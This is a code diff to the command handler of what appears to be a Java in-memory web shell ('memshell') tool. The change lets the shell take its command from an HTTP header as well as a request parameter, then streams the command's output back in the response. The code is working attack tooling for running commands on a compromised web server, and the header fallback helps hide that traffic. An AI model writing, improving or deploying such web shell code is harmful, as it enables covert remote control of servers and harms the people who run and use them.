@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.shelltool.command;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Field;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -17,15 +18,15 @@ public class Command {
         Object request = unwrap(args[0], "request");
         Object response = unwrap(args[1], "response");
         try {
-            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (param != null) {
+            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
+            if (p == null || p.isEmpty()) {
+                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                 return true;
             }
         } catch (Throwable e) {
